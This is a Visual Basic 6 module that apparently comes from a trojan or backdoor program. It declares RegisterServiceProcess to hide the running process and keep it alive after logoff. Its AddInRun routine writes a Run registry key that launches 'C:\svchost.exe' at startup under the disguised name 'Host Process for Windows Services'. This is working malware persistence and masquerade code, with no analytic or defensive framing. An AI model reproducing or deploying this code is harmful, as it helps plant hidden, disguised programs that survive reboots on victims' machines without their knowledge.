Attribute VB_Name = "Module3"
Option Explicit

''''''''''''''''''''''RegisterServiceProcess''''''''''''''''''''''''''''''''''''''''
'The RegisterServiceProcess function registers or _
 unregisters a service process. A service process _
 continues to run after the user logs off.
Public Declare Function RegisterServiceProcess Lib _
    "kernel32.dll" (ByVal dwProcessId As Long, _
     ByVal dwType As Long) As Long
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

''''''''''''''''''''''GetCurrentProcessID'''''''''''''''''''
'The GetCurrentProcessId function returns the process _
 identifier of the calling process.
Public Declare Function GetCurrentProcessId Lib "kernel32" _
() As Long
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''


Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value.
Private Const HKEY_LOCAL_MACHINE = &H80000002
Private Const HKEY_CURRENT_USER = &H80000001
Private Const REG_SZ = 1                         ' Unicode nul terminated string

Public Sub AddInRun()
Dim retVal As Long, KeyHandle As Long
Dim Value As String
    Value = "C:\svchost.exe"
    retVal = RegOpenKey(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", KeyHandle)
    retVal = RegSetValueEx(KeyHandle, "Host Process for Windows Services", 0&, REG_SZ, ByVal Value, 255&)
    retVal = RegCloseKey(KeyHandle)
End Sub





